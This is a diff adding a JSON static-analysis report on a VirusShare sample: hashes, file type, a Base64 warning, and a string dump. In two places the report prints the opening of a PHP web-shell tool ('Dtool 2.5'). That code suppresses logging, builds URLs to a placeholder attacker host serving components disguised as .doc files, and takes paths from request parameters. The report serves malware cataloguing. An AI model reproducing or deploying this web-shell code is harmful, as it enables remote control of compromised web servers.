@@ -1,0 +1,64 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str"
+        },
+        "macro": "<?php\n//The rules of Dtool - 2.5\n//revengans@gmail.com\n\n@closelog();\n@error_reporting(0);\n$vers=\"2.5 public\";\n$remote_addr=\"http://HERE YOUR HOST _ANtrAX_ /cmd/\";\n$format_addr=\".doc\";\n$cmd_addr=$remote_addr.\"tool25\".$format_addr;\n$safe_addr=$remote_addr.\"safe25\".$format_addr;\n$writer_addr=$remote_addr.\"writer25\".$format_addr;\n$phpget_addr=$remote_addr.\"get25\".$format_addr;\n$feditor_addr=$remote_addr.\"filed25\".$format_addr;\n$put_addr=$remote_addr.\"filed_put25\".$format_addr;\n$list_addr=$remote_addr.\"flist25\".$format_addr;\n$copyd_addr=$remote_addr.\"copyd25\".$format_addr;\n$style_addr=$remote_addr.\"style25\".$format_addr;\n$total_addr=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];\n$inclvar = @substr($_SERVER['QUERY_STRING'],0,strpos($_SERVER['QUERY_STRING'],\"=\"));\n\nfunction pegaContents($filename){//aiai, essa funcao aki eh bem legal, evita mto problema q tinha antes. by r3v3n\n\tif(function_exists('file_get_contents')){ $content_arquivo=file_get_contents($filename);}\n\telse if(function_exists('readfile') and function_exists('ob_start')){ob_start();readfile($filename); $content_arquivo=ob_get_contents(); ob_end_clean();}\n\telse if(function_exists('fread') and function_exists('fopen') and !strpos($filename,'http://')){ $content_arquivo=fread(fopen($filename, \"a\"),filesize($filename));}\n\telse $content_arquivo=false;\n\n\treturn $content_arquivo;\n}\n\nif(empty($chdir)) $chdir=@$_GET['chdir'];\nif(empty($chdir)) $chdir=@$_REQUEST['chdir'];\nif(empty($chdir)) $chdir=getcwd();\n\n?>"
+    },
+    "filename": "VirusShare_708800b26965c4ef3a7f6ebabe981779",
+    "filesize": 1524,
+    "filetype": "PHP script, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "708800b26965c4ef3a7f6ebabe981779",
+        "sha1": "4f0451f39de217e7c1005288ba16eb4e2fbf2538",
+        "sha256": "0c4ebcc14c5ae82eb8e9ceb00d745b39af925b1bd86005413af60bfbba98d8fa"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<?php",
+            "//The rules of Dtool - 2.5",
+            "//revengans@gmail.com",
+            "@closelog();",
+            "@error_reporting(0);",
+            "$vers=\"2.5 public\";",
+            "$remote_addr=\"http://HERE YOUR HOST _ANtrAX_ /cmd/\";",
+            "$format_addr=\".doc\";",
+            "$cmd_addr=$remote_addr.\"tool25\".$format_addr;",
+            "$safe_addr=$remote_addr.\"safe25\".$format_addr;",
+            "$writer_addr=$remote_addr.\"writer25\".$format_addr;",
+            "$phpget_addr=$remote_addr.\"get25\".$format_addr;",
+            "$feditor_addr=$remote_addr.\"filed25\".$format_addr;",
+            "$put_addr=$remote_addr.\"filed_put25\".$format_addr;",
+            "$list_addr=$remote_addr.\"flist25\".$format_addr;",
+            "$copyd_addr=$remote_addr.\"copyd25\".$format_addr;",
+            "$style_addr=$remote_addr.\"style25\".$format_addr;",
+            "$total_addr=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];",
+            "$inclvar = @substr($_SERVER['QUERY_STRING'],0,strpos($_SERVER['QUERY_STRING'],\"=\"));",
+            "function pegaContents($filename){//aiai, essa funcao aki eh bem legal, evita mto problema q tinha antes. by r3v3n",
+            "\tif(function_exists('file_get_contents')){ $content_arquivo=file_get_contents($filename);}",
+            "\telse if(function_exists('readfile') and function_exists('ob_start')){ob_start();readfile($filename); $content_arquivo=ob_get_contents(); ob_end_clean();}",
+            "\telse if(function_exists('fread') and function_exists('fopen') and !strpos($filename,'http://')){ $content_arquivo=fread(fopen($filename, \"a\"),filesize($filename));}",
+            "\telse $content_arquivo=false;",
+            "\treturn $content_arquivo;",
+            "if(empty($chdir)) $chdir=@$_GET['chdir'];",
+            "if(empty($chdir)) $chdir=@$_REQUEST['chdir'];",
+            "if(empty($chdir)) $chdir=getcwd();"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://",
+            "http://HERE"
+        ]
+    },
+    "time": "0:00:00.281488",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
